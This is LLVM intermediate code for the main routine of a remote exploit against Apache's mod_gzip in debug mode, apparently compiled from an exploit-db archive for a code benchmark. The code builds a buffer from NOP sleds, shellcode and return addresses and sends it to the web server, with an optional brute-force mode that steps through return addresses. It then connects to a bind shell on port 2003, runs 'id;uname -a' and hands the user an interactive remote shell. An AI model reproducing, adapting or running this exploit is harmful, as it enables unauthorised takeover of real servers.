; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22699.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22699.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i64, i64, i8*, i8* }
%struct.sockaddr_in = type { i8*, %struct.TYPE_3__, i8*, i32 }
%struct.TYPE_3__ = type { i8* }
%struct.hostent = type { i32 }
%struct.sockaddr = type { i32 }

@STEP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [106 x i8] c"\0Aremote exploit for mod_gzip (debug_mode) [Linux/*BSD]\0A\09\09 by xCrZx [crazy_einstein@yahoo.com] /05.06.03/\0A\00", align 1
@targets = common dso_local global %struct.TYPE_4__* null, align 8
@.str.1 = private unnamed_addr constant [5 x i8] c"0x%x\00", align 1
@.str.2 = private unnamed_addr constant [35 x i8] c"\0AUsing: ret_err = 0x%x, ret = 0x%x\00", align 1
@.str.3 = private unnamed_addr constant [13 x i8] c" ,step = %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.5 = private unnamed_addr constant [26 x i8] c"[~] Brutemode activated!\0A\00", align 1
@PF_INET = common dso_local global i8* null, align 8
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [26 x i8] c"\0A[!] Connecting to %s:%d\0A\00", align 1
@.str.7 = private unnamed_addr constant [16 x i8] c"[+] Connected!\0A\00", align 1
@fmt = common dso_local global i8* null, align 8
@.str.8 = private unnamed_addr constant [40 x i8] c"[x] Error: Could not connect to %s:%d!\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c".\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [58 x i8] c"[*] Trying to connect to %s:%d port!!! Pray for success!\0A\00", align 1
@.str.11 = private unnamed_addr constant [30 x i8] c"[*] Sleeping at 2 seconds...\0A\00", align 1
@.str.12 = private unnamed_addr constant [28 x i8] c"\0A[!] Shell is accessible!\0A\0A\00", align 1
@.str.13 = private unnamed_addr constant [13 x i8] c"id;uname -a\0A\00", align 1
@STDIN_FILENO = common dso_local global i32 0, align 4
@.str.14 = private unnamed_addr constant [24 x i8] c"[!] Connection closed.\0A\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.16 = private unnamed_addr constant [30 x i8] c"[x] Shell is inaccessible..\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 8
  %8 = alloca %struct.hostent*, align 8
  %9 = alloca [20000 x i8], align 16
  %10 = alloca [5000 x i8], align 16
  %11 = alloca [10000 x i8], align 16
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i64, align 8
  %19 = alloca i64, align 8
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 80, i32* %14, align 4
  store i32 2003, i32* %15, align 4
  %24 = load i32, i32* @STEP, align 4
  store i32 %24, i32* %16, align 4
  store i8* null, i8** %17, align 8
  store i64 3221225471, i64* %18, align 8
  store i32 0, i32* %20, align 4
  store i32 0, i32* %23, align 4
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str, i64 0, i64 0))
  store i32 0, i32* %6, align 4
  br label %26

26:                                               ; preds = %152, %2
  %27 = load i32, i32* %6, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp slt i32 %27, %28
  br i1 %29, label %30, label %155

30:                                               ; preds = %26
  %31 = load i8**, i8*** %5, align 8
  %32 = load i32, i32* %6, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8*, i8** %31, i64 %33
  %35 = load i8*, i8** %34, align 8
  %36 = getelementptr inbounds i8, i8* %35, i64 1
  %37 = load i8, i8* %36, align 1
  %38 = sext i8 %37 to i32
  %39 = icmp eq i32 %38, 104
  br i1 %39, label %40, label %47

40:                                               ; preds = %30
  %41 = load i8**, i8*** %5, align 8
  %42 = load i32, i32* %6, align 4
  %43 = add nsw i32 %42, 1
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8*, i8** %41, i64 %44
  %46 = load i8*, i8** %45, align 8
  store i8* %46, i8** %17, align 8
  br label %47

47:                                               ; preds = %40, %30
  %48 = load i8**, i8*** %5, align 8
  %49 = load i32, i32* %6, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8*, i8** %48, i64 %50
  %52 = load i8*, i8** %51, align 8
  %53 = getelementptr inbounds i8, i8* %52, i64 1
  %54 = load i8, i8* %53, align 1
  %55 = sext i8 %54 to i32
  %56 = icmp eq i32 %55, 112
  br i1 %56, label %57, label %66

57:                                               ; preds = %47
  %58 = load i8**, i8*** %5, align 8
  %59 = load i32, i32* %6, align 4
  %60 = add nsw i32 %59, 1
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8*, i8** %58, i64 %61
  %63 = load i8*, i8** %62, align 8
  %64 = call i64 @atoi(i8* %63)
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %14, align 4
  br label %66

66:                                               ; preds = %57, %47
  %67 = load i8**, i8*** %5, align 8
  %68 = load i32, i32* %6, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8*, i8** %67, i64 %69
  %71 = load i8*, i8** %70, align 8
  %72 = getelementptr inbounds i8, i8* %71, i64 1
  %73 = load i8, i8* %72, align 1
  %74 = sext i8 %73 to i32
  %75 = icmp eq i32 %74, 116
  br i1 %75, label %76, label %96

76:                                               ; preds = %66
  %77 = load %struct.TYPE_4__*, %struct.TYPE_4__** @targets, align 8
  %78 = load i8**, i8*** %5, align 8
  %79 = load i32, i32* %6, align 4
  %80 = add nsw i32 %79, 1
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8*, i8** %78, i64 %81
  %83 = load i8*, i8** %82, align 8
  %84 = call i64 @atoi(i8* %83)
  %85 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %77, i64 %84
  %86 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %85, i32 0, i32 0
  %87 = load i64, i64* %86, align 8
  store i64 %87, i64* %18, align 8
  %88 = load i8**, i8*** %5, align 8
  %89 = load i32, i32* %6, align 4
  %90 = add nsw i32 %89, 1
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds i8*, i8** %88, i64 %91
  %93 = load i8*, i8** %92, align 8
  %94 = call i64 @atoi(i8* %93)
  %95 = trunc i64 %94 to i32
  store i32 %95, i32* %23, align 4
  br label %96

96:                                               ; preds = %76, %66
  %97 = load i8**, i8*** %5, align 8
  %98 = load i32, i32* %6, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds i8*, i8** %97, i64 %99
  %101 = load i8*, i8** %100, align 8
  %102 = getelementptr inbounds i8, i8* %101, i64 1
  %103 = load i8, i8* %102, align 1
  %104 = sext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %114

106:                                              ; preds = %96
  %107 = load i8**, i8*** %5, align 8
  %108 = load i32, i32* %6, align 4
  %109 = add nsw i32 %108, 1
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i8*, i8** %107, i64 %110
  %112 = load i8*, i8** %111, align 8
  %113 = call i32 @sscanf(i8* %112, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0), i64* %18)
  br label %114

114:                                              ; preds = %106, %96
  %115 = load i8**, i8*** %5, align 8
  %116 = load i32, i32* %6, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  %119 = load i8*, i8** %118, align 8
  %120 = getelementptr inbounds i8, i8* %119, i64 1
  %121 = load i8, i8* %120, align 1
  %122 = sext i8 %121 to i32
  %123 = icmp eq i32 %122, 98
  br i1 %123, label %124, label %132

124:                                              ; preds = %114
  store i32 1, i32* %20, align 4
  %125 = load i8**, i8*** %5, align 8
  %126 = load i32, i32* %6, align 4
  %127 = add nsw i32 %126, 1
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds i8*, i8** %125, i64 %128
  %130 = load i8*, i8** %129, align 8
  %131 = call i64 @strtoul(i8* %130, i32 0, i32 16)
  store i64 %131, i64* %18, align 8
  br label %132

132:                                              ; preds = %124, %114
  %133 = load i8**, i8*** %5, align 8
  %134 = load i32, i32* %6, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds i8*, i8** %133, i64 %135
  %137 = load i8*, i8** %136, align 8
  %138 = getelementptr inbounds i8, i8* %137, i64 1
  %139 = load i8, i8* %138, align 1
  %140 = sext i8 %139 to i32
  %141 = icmp eq i32 %140, 115
  br i1 %141, label %142, label %151

142:                                              ; preds = %132
  %143 = load i8**, i8*** %5, align 8
  %144 = load i32, i32* %6, align 4
  %145 = add nsw i32 %144, 1
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds i8*, i8** %143, i64 %146
  %148 = load i8*, i8** %147, align 8
  %149 = call i64 @atoi(i8* %148)
  %150 = trunc i64 %149 to i32
  store i32 %150, i32* %16, align 4
  br label %151

151:                                              ; preds = %142, %132
  br label %152

152:                                              ; preds = %151
  %153 = load i32, i32* %6, align 4
  %154 = add nsw i32 %153, 1
  store i32 %154, i32* %6, align 4
  br label %26

155:                                              ; preds = %26
  %156 = load i8*, i8** %17, align 8
  %157 = icmp ne i8* %156, null
  br i1 %157, label %158, label %161

158:                                              ; preds = %155
  %159 = load i64, i64* %18, align 8
  %160 = icmp eq i64 %159, 0
  br i1 %160, label %161, label %166

161:                                              ; preds = %158, %155
  %162 = load i8**, i8*** %5, align 8
  %163 = getelementptr inbounds i8*, i8** %162, i64 0
  %164 = load i8*, i8** %163, align 8
  %165 = call i32 @usage(i8* %164)
  br label %166

166:                                              ; preds = %161, %158
  %167 = load %struct.TYPE_4__*, %struct.TYPE_4__** @targets, align 8
  %168 = load i32, i32* %23, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %167, i64 %169
  %171 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %170, i32 0, i32 1
  %172 = load i64, i64* %171, align 8
  store i64 %172, i64* %19, align 8
  %173 = load %struct.TYPE_4__*, %struct.TYPE_4__** @targets, align 8
  %174 = load i32, i32* %23, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %173, i64 %175
  %177 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %176, i32 0, i32 2
  %178 = load i8*, i8** %177, align 8
  store i8* %178, i8** %21, align 8
  %179 = load %struct.TYPE_4__*, %struct.TYPE_4__** @targets, align 8
  %180 = load i32, i32* %23, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %179, i64 %181
  %183 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %182, i32 0, i32 3
  %184 = load i8*, i8** %183, align 8
  store i8* %184, i8** %22, align 8
  %185 = load i64, i64* %19, align 8
  %186 = load i64, i64* %18, align 8
  %187 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.2, i64 0, i64 0), i64 %185, i64 %186)
  %188 = load i32, i32* %20, align 4
  %189 = icmp ne i32 %188, 0
  br i1 %189, label %190, label %193

190:                                              ; preds = %166
  %191 = load i32, i32* %16, align 4
  %192 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.3, i64 0, i64 0), i32 %191)
  br label %193

193:                                              ; preds = %190, %166
  %194 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  %195 = load i32, i32* %20, align 4
  %196 = icmp ne i32 %195, 0
  br i1 %196, label %197, label %199

197:                                              ; preds = %193
  %198 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.5, i64 0, i64 0))
  br label %199

199:                                              ; preds = %197, %193
  br label %200

200:                                              ; preds = %407, %199
  %201 = load i8*, i8** @PF_INET, align 8
  %202 = load i32, i32* @SOCK_STREAM, align 4
  %203 = call i32 @socket(i8* %201, i32 %202, i32 0)
  store i32 %203, i32* %12, align 4
  %204 = load i8*, i8** @PF_INET, align 8
  %205 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i8* %204, i8** %205, align 8
  %206 = load i8*, i8** %17, align 8
  %207 = call i8* @getip(i8* %206)
  %208 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  %209 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %208, i32 0, i32 0
  store i8* %207, i8** %209, align 8
  %210 = load i32, i32* %14, align 4
  %211 = call i8* @htons(i32 %210)
  %212 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i8* %211, i8** %212, align 8
  %213 = load i32, i32* %20, align 4
  %214 = icmp ne i32 %213, 0
  br i1 %214, label %219, label %215

215:                                              ; preds = %200
  %216 = load i8*, i8** %17, align 8
  %217 = load i32, i32* %14, align 4
  %218 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.6, i64 0, i64 0), i8* %216, i32 %217)
  br label %219

219:                                              ; preds = %215, %200
  %220 = load i32, i32* %12, align 4
  %221 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %222 = call i32 @connect(i32 %220, %struct.sockaddr* %221, i32 32)
  %223 = icmp sgt i32 %222, -1
  br i1 %223, label %224, label %298

224:                                              ; preds = %219
  %225 = load i32, i32* %20, align 4
  %226 = icmp ne i32 %225, 0
  br i1 %226, label %230, label %227

227:                                              ; preds = %224
  %228 = load i32, i32* %6, align 4
  %229 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.7, i64 0, i64 0), i32 %228)
  br label %230

230:                                              ; preds = %227, %224
  %231 = getelementptr inbounds [20000 x i8], [20000 x i8]* %9, i64 0, i64 0
  %232 = call i32 @memset(i8* %231, i32 0, i32 20000)
  %233 = getelementptr inbounds [5000 x i8], [5000 x i8]* %10, i64 0, i64 0
  %234 = call i32 @memset(i8* %233, i32 0, i32 5000)
  %235 = getelementptr inbounds [10000 x i8], [10000 x i8]* %11, i64 0, i64 0
  %236 = call i32 @memset(i8* %235, i32 0, i32 10000)
  %237 = getelementptr inbounds [5000 x i8], [5000 x i8]* %10, i64 0, i64 0
  %238 = call i32 @memset(i8* %237, i32 144, i32 2016)
  %239 = getelementptr inbounds [5000 x i8], [5000 x i8]* %10, i64 0, i64 0
  %240 = getelementptr inbounds [5000 x i8], [5000 x i8]* %10, i64 0, i64 0
  %241 = call i32 @strlen(i8* %240)
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds i8, i8* %239, i64 %242
  %244 = load i8*, i8** %22, align 8
  %245 = load i8*, i8** %22, align 8
  %246 = call i32 @strlen(i8* %245)
  %247 = call i32 @memcpy(i8* %243, i8* %244, i32 %246)
  %248 = getelementptr inbounds [5000 x i8], [5000 x i8]* %10, i64 0, i64 0
  %249 = getelementptr inbounds [5000 x i8], [5000 x i8]* %10, i64 0, i64 0
  %250 = call i32 @strlen(i8* %249)
  %251 = sext i32 %250 to i64
  %252 = getelementptr inbounds i8, i8* %248, i64 %251
  %253 = call i32 @memset(i8* %252, i32 144, i32 2280)
  %254 = load i64, i64* %19, align 8
  %255 = getelementptr inbounds [5000 x i8], [5000 x i8]* %10, i64 0, i64 0
  %256 = call i32 @strlen(i8* %255)
  %257 = sext i32 %256 to i64
  %258 = getelementptr inbounds [5000 x i8], [5000 x i8]* %10, i64 0, i64 %257
  %259 = bitcast i8* %258 to i64*
  store i64 %254, i64* %259, align 1
  store i32 0, i32* %6, align 4
  br label %260

260:                                              ; preds = %270, %230
  %261 = load i32, i32* %6, align 4
  %262 = icmp slt i32 %261, 100
  br i1 %262, label %263, label %273

263:                                              ; preds = %260
  %264 = load i64, i64* %18, align 8
  %265 = getelementptr inbounds [5000 x i8], [5000 x i8]* %10, i64 0, i64 0
  %266 = call i32 @strlen(i8* %265)
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds [5000 x i8], [5000 x i8]* %10, i64 0, i64 %267
  %269 = bitcast i8* %268 to i64*
  store i64 %264, i64* %269, align 1
  br label %270

270:                                              ; preds = %263
  %271 = load i32, i32* %6, align 4
  %272 = add nsw i32 %271, 1
  store i32 %272, i32* %6, align 4
  br label %260

273:                                              ; preds = %260
  %274 = getelementptr inbounds [10000 x i8], [10000 x i8]* %11, i64 0, i64 0
  %275 = call i32 @memset(i8* %274, i32 144, i32 1000)
  %276 = getelementptr inbounds [10000 x i8], [10000 x i8]* %11, i64 0, i64 0
  %277 = getelementptr inbounds [10000 x i8], [10000 x i8]* %11, i64 0, i64 0
  %278 = call i32 @strlen(i8* %277)
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds i8, i8* %276, i64 %279
  %281 = load i8*, i8** %21, align 8
  %282 = load i8*, i8** %21, align 8
  %283 = call i32 @strlen(i8* %282)
  %284 = call i32 @memcpy(i8* %280, i8* %281, i32 %283)
  %285 = getelementptr inbounds [20000 x i8], [20000 x i8]* %9, i64 0, i64 0
  %286 = load i8*, i8** @fmt, align 8
  %287 = getelementptr inbounds [5000 x i8], [5000 x i8]* %10, i64 0, i64 0
  %288 = load i8*, i8** %17, align 8
  %289 = getelementptr inbounds [10000 x i8], [10000 x i8]* %11, i64 0, i64 0
  %290 = call i32 @strlen(i8* %289)
  %291 = getelementptr inbounds [10000 x i8], [10000 x i8]* %11, i64 0, i64 0
  %292 = call i32 @sprintf(i8* %285, i8* %286, i8* %287, i8* %288, i32 %290, i8* %291)
  %293 = load i32, i32* %12, align 4
  %294 = getelementptr inbounds [20000 x i8], [20000 x i8]* %9, i64 0, i64 0
  %295 = getelementptr inbounds [20000 x i8], [20000 x i8]* %9, i64 0, i64 0
  %296 = call i32 @strlen(i8* %295)
  %297 = call i32 @write(i32 %293, i8* %294, i32 %296)
  br label %303

298:                                              ; preds = %219
  %299 = load i8*, i8** %17, align 8
  %300 = load i32, i32* %14, align 4
  %301 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.8, i64 0, i64 0), i8* %299, i32 %300)
  %302 = call i32 @exit(i32 0) #3
  unreachable

303:                                              ; preds = %273
  %304 = load i32, i32* %12, align 4
  %305 = call i32 @close(i32 %304)
  %306 = load i32, i32* %16, align 4
  %307 = sext i32 %306 to i64
  %308 = load i64, i64* %18, align 8
  %309 = sub nsw i64 %308, %307
  store i64 %309, i64* %18, align 8
  %310 = load i32, i32* %20, align 4
  %311 = icmp ne i32 %310, 0
  br i1 %311, label %312, label %316

312:                                              ; preds = %303
  %313 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0))
  %314 = load i32, i32* @stdout, align 4
  %315 = call i32 @fflush(i32 %314)
  br label %316

316:                                              ; preds = %312, %303
  %317 = load i32, i32* %20, align 4
  %318 = icmp ne i32 %317, 0
  br i1 %318, label %324, label %319

319:                                              ; preds = %316
  %320 = load i8*, i8** %17, align 8
  %321 = load i32, i32* %15, align 4
  %322 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.10, i64 0, i64 0), i8* %320, i32 %321)
  %323 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.11, i64 0, i64 0))
  br label %324

324:                                              ; preds = %319, %316
  %325 = call i32 @sleep(i32 2)
  %326 = load i8*, i8** @PF_INET, align 8
  %327 = load i32, i32* @SOCK_STREAM, align 4
  %328 = call i32 @socket(i8* %326, i32 %327, i32 0)
  store i32 %328, i32* %12, align 4
  %329 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 3
  %330 = load i32, i32* %329, align 8
  %331 = call i32 @bzero(i32 %330, i32 4)
  %332 = load i8*, i8** @PF_INET, align 8
  %333 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i8* %332, i8** %333, align 8
  %334 = load i8*, i8** %17, align 8
  %335 = call i8* @getip(i8* %334)
  %336 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  %337 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %336, i32 0, i32 0
  store i8* %335, i8** %337, align 8
  %338 = load i32, i32* %15, align 4
  %339 = call i8* @htons(i32 %338)
  %340 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i8* %339, i8** %340, align 8
  %341 = load i32, i32* %12, align 4
  %342 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %343 = call i32 @connect(i32 %341, %struct.sockaddr* %342, i32 32)
  %344 = icmp sgt i32 %343, -1
  br i1 %344, label %345, label %398

345:                                              ; preds = %324
  %346 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.12, i64 0, i64 0))
  %347 = load i32, i32* %12, align 4
  %348 = call i32 @write(i32 %347, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.13, i64 0, i64 0), i32 12)
  br label %349

349:                                              ; preds = %345, %397
  %350 = call i32 @FD_ZERO(i32* %13)
  %351 = load i32, i32* %12, align 4
  %352 = call i32 @FD_SET(i32 %351, i32* %13)
  %353 = load i32, i32* @STDIN_FILENO, align 4
  %354 = call i32 @FD_SET(i32 %353, i32* %13)
  %355 = load i32, i32* %12, align 4
  %356 = add nsw i32 %355, 1
  %357 = call i32 @select(i32 %356, i32* %13, i32* null, i32* null, i32* null)
  %358 = load i32, i32* %12, align 4
  %359 = call i64 @FD_ISSET(i32 %358, i32* %13)
  %360 = icmp ne i64 %359, 0
  br i1 %360, label %361, label %378

361:                                              ; preds = %349
  %362 = load i32, i32* %12, align 4
  %363 = getelementptr inbounds [20000 x i8], [20000 x i8]* %9, i64 0, i64 0
  %364 = call i32 @read(i32 %362, i8* %363, i32 19999)
  store i32 %364, i32* %6, align 4
  %365 = load i32, i32* %6, align 4
  %366 = icmp sle i32 %365, 0
  br i1 %366, label %367, label %372

367:                                              ; preds = %361
  %368 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.14, i64 0, i64 0))
  %369 = load i32, i32* %12, align 4
  %370 = call i32 @close(i32 %369)
  %371 = call i32 @exit(i32 0) #3
  unreachable

372:                                              ; preds = %361
  %373 = load i32, i32* %6, align 4
  %374 = sext i32 %373 to i64
  %375 = getelementptr inbounds [20000 x i8], [20000 x i8]* %9, i64 0, i64 %374
  store i8 0, i8* %375, align 1
  %376 = getelementptr inbounds [20000 x i8], [20000 x i8]* %9, i64 0, i64 0
  %377 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0), i8* %376)
  br label %378

378:                                              ; preds = %372, %349
  %379 = load i32, i32* @STDIN_FILENO, align 4
  %380 = call i64 @FD_ISSET(i32 %379, i32* %13)
  %381 = icmp ne i64 %380, 0
  br i1 %381, label %382, label %397

382:                                              ; preds = %378
  %383 = load i32, i32* @STDIN_FILENO, align 4
  %384 = getelementptr inbounds [20000 x i8], [20000 x i8]* %9, i64 0, i64 0
  %385 = call i32 @read(i32 %383, i8* %384, i32 19999)
  store i32 %385, i32* %6, align 4
  %386 = load i32, i32* %6, align 4
  %387 = icmp sgt i32 %386, 0
  br i1 %387, label %388, label %396

388:                                              ; preds = %382
  %389 = load i32, i32* %6, align 4
  %390 = sext i32 %389 to i64
  %391 = getelementptr inbounds [20000 x i8], [20000 x i8]* %9, i64 0, i64 %390
  store i8 0, i8* %391, align 1
  %392 = load i32, i32* %12, align 4
  %393 = getelementptr inbounds [20000 x i8], [20000 x i8]* %9, i64 0, i64 0
  %394 = load i32, i32* %6, align 4
  %395 = call i32 @write(i32 %392, i8* %393, i32 %394)
  br label %396

396:                                              ; preds = %388, %382
  br label %397

397:                                              ; preds = %396, %378
  br label %349

398:                                              ; preds = %324
  %399 = load i32, i32* %20, align 4
  %400 = icmp ne i32 %399, 0
  br i1 %400, label %403, label %401

401:                                              ; preds = %398
  %402 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.16, i64 0, i64 0))
  br label %403

403:                                              ; preds = %401, %398
  br label %404

404:                                              ; preds = %403
  %405 = load i32, i32* %12, align 4
  %406 = call i32 @close(i32 %405)
  br label %407

407:                                              ; preds = %404
  %408 = load i32, i32* %20, align 4
  %409 = icmp ne i32 %408, 0
  br i1 %409, label %200, label %410

410:                                              ; preds = %407
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @atoi(i8*) #1

declare dso_local i32 @sscanf(i8*, i8*, i64*) #1

declare dso_local i64 @strtoul(i8*, i32, i32) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @socket(i8*, i32, i32) #1

declare dso_local i8* @getip(i8*) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*, i8*, i32, i8*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @close(i32) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @bzero(i32, i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
